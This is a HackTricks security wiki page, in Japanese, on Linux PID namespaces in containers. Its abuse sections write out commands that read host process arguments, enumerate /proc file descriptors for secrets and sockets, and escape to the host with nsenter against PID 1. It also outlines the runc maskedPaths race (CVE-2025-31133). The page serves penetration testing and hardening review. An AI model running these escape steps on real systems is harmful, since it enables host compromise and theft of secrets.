# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

PID namespace は、プロセスの番号付け方法と、どのプロセスが可視になるかを制御します。これにより、実際のマシンではないにもかかわらず、container が独自の PID 1 を持てます。namespace 内では、workload からはローカルのプロセスツリーのように見えるものが認識されます。namespace の外側では、host は実際の host PID と、プロセス全体の状況を引き続き認識します。

security の観点では、PID namespace が重要なのは、プロセスの可視性に価値があるためです。workload から host のプロセスが見えるようになると、service 名、command-line 引数、プロセス引数に渡された secrets、`/proc` を通じた環境由来の状態、さらに namespace-entry の対象候補を観察できる可能性があります。さらに、単にそれらのプロセスを見られるだけでなく、適切な条件下で signal の送信や ptrace の利用などができる場合、問題ははるかに深刻になります。

## 動作

新しい PID namespace は、内部で独自のプロセス番号付けを開始します。その中で最初に作成されたプロセスは、namespace の観点から PID 1 になります。これは、孤児化した子プロセスや signal の動作に対して、init に似た特別なセマンティクスを持つことも意味します。これにより、init プロセス、zombie の回収、そして container で小さな init wrapper が使用されることがある理由の多くを説明できます。

重要な security 上の教訓は、プロセスが自身の PID ツリーだけを認識しているため隔離されているように見えても、その隔離を意図的に解除できるということです。Docker では `--pid=host` を通じてこれを実現し、Kubernetes では `hostPID: true` を使用します。container が host の PID namespace に参加すると、workload から host のプロセスを直接認識できるようになり、その後に続く多くの attack path がはるかに現実的になります。

## Lab

PID namespace を手動で作成するには:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
shellからは、privateなプロセスビューが見えるようになりました。`--mount-proc` flagが重要なのは、新しいPID namespaceに対応するprocfs instanceをmountし、内部から見たプロセスリストの整合性を保つためです。

containerの挙動を比較するには:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
この違いはすぐに理解できるため、読者にとって最初の lab として適しています。

## Runtime Usage

Docker、Podman、containerd、CRI-O の通常のコンテナには、それぞれ独自の PID namespace が割り当てられます。Kubernetes Pods も通常は分離された PID view を受け取りますが、workload が明示的に host PID sharing を要求した場合は例外です。LXC/Incus 環境も同じ kernel primitive に依存していますが、system-container のユースケースでは、より複雑な process tree が公開され、より多くの debugging shortcut が使われる可能性があります。

同じルールがどこでも適用されます。runtime が PID namespace を分離しないことを選択した場合、それは container boundary を意図的に弱めているということです。

## Misconfigurations

典型的な misconfiguration は host PID sharing です。チームは debugging、monitoring、または service-management の利便性を理由に正当化することがよくありますが、常に意味のある security exception として扱うべきです。コンテナが host process に対する直接的な write primitive を持っていない場合でも、visibility だけでシステムに関する多くの情報が明らかになる可能性があります。`CAP_SYS_PTRACE` のような capability や有用な procfs access が追加されると、risk は大幅に拡大します。

もう一つの間違いは、workload がデフォルトでは host process を kill したり ptrace したりできないため、host PID sharing は harmless だと考えることです。この結論は、enumeration の価値、namespace-entry target の存在、そして PID visibility が他の弱められた control と組み合わさることで生じる影響を無視しています。

## Abuse

host PID namespace が共有されている場合、attacker は host process を調査し、process argument を取得し、興味深い service を特定し、`nsenter` 用の候補 PID を見つけたり、process visibility と ptrace 関連の privilege を組み合わせて host または隣接する workload に干渉したりできます。場合によっては、適切な long-running process が見えるだけで、その後の attack plan 全体を組み立て直すのに十分です。

最初の実践的な step は、host process が実際に見えていることを必ず確認することです。
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
ホストの PID が可視になると、プロセス引数と namespace-entry targets が最も有用な情報源になることが多いです：
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter` が利用可能で十分な権限がある場合、可視のホストプロセスを namespace bridge として使用できるかテストします：
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
エントリがブロックされている場合でも、host PID の共有には、サービス構成、実行時コンポーネント、そして次の標的候補となる特権プロセスが明らかになるため、すでに価値があります。

host PID の可視性によって、file descriptor の悪用もより現実的になります。特権を持つ host プロセスや隣接する workload が機密性の高いファイルまたはソケットを open している場合、攻撃者は所有権、procfs の mount オプション、標的サービスのモデルによっては、`/proc/<pid>/fd/` を調査し、その handle を再利用できる可能性があります。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
これらのコマンドは、`hidepid=1` または `hidepid=2` によってプロセス間の可視性が低下しているかどうか、また、開いている secret files、logs、Unix sockets などの明らかに興味深い file descriptors がそもそも可視かどうかを確認するのに役立ちます。

### 完全な例: host PID + `nsenter`

プロセスが host namespaces に join できる十分な privilege も持っている場合、Host PID sharing は直接的な host escape になります。
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
コマンドが成功すると、コンテナプロセスはホストの mount、UTS、network、IPC、PID namespaces 内で実行されるようになります。影響は即時のホスト侵害です。

`nsenter` 自体が存在しない場合でも、ホストのファイルシステムがマウントされていれば、ホストのバイナリを通じて同じ結果を実現できる可能性があります。
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Recent Runtime Notes

一部の PID namespace 関連攻撃は、従来の `hostPID: true` の misconfiguration ではなく、container の setup 中に procfs protections が適用される方法に関する runtime implementation bug です。

#### `maskedPaths` race to host procfs

脆弱な `runc` versions では、container image または `runc exec` workload を制御できる攻撃者が、container 側の `/dev/null` を `/proc/sys/kernel/core_pattern` などの sensitive な procfs path への symlink に置き換えることで、masking phase と race できました。race に成功すると、masked-path bind mount が誤った target に適用され、新しい container に host-global procfs knobs が expose される可能性があります。<sup>[[1]](#references)</sup>

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
これは重要です。最終的な影響が、直接的な procfs の露出と同じになる可能性があるためです。つまり、書き込み可能な `core_pattern` または `sysrq-trigger` に続いて、ホスト上でのコード実行や DoS が発生する可能性があります。

#### `insject` による Namespace injection

`insject` などの Namespace injection ツールは、PID namespace との相互作用において、プロセス作成前に対象 namespace へ入っておくことが必ずしも必要ではないことを示しています。ヘルパーは後からアタッチし、`setns()` を使用して、対象の PID 空間への可視性を維持したまま実行できます。<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
この種の technique は、主に高度なデバッグ、offensive tooling、post-exploitation workflow において重要です。runtime の初期化がすでに完了した後に、namespace context を結合する必要がある場合に使用されます。

### Related FD Abuse パターン

host PIDs が可視である場合、2つのパターンを明示的に挙げる価値があります。まず、privileged process が `O_CLOEXEC` を設定されていないため、`execve()` 後も sensitive file descriptor を開いたまま保持することがあります。次に、service が `SCM_RIGHTS` を介して Unix socket 上で file descriptor を渡すことがあります。どちらの場合も、重要なのはもはや pathname ではなく、lower-privilege process が継承または受信できる、すでに開かれた handle です。

これは container work において重要です。handle が `docker.sock`、privileged log、host secret file、その他の high-value object を指している可能性があるためです。たとえその path 自体が container filesystem から直接到達できない場合でも同様です。

## チェック

これらの command の目的は、process が private PID view を持っているのか、それともはるかに広範な process landscape をすでに列挙できるのかを確認することです。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
ここで注目すべき点:

- プロセス一覧に明らかなホストサービスが含まれている場合、ホスト PID の共有はおそらくすでに有効になっています。
- 小規模な container-local ツリーしか表示されないのが通常のベースラインです。`systemd`、`dockerd`、または無関係な daemon が表示されるのは通常ではありません。
- ホスト PID が可視になると、読み取り専用のプロセス情報でさえ有用な reconnaissance になります。

ホスト PID 共有で動作している container を発見した場合、それを単なる見た目上の違いとして扱わないでください。これは、workload が監視でき、場合によっては影響を及ぼせる対象を大きく変えるものです。

## References

- [1] [runc security advisory: mount race conditions による「masked path」悪用を介した container escape (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
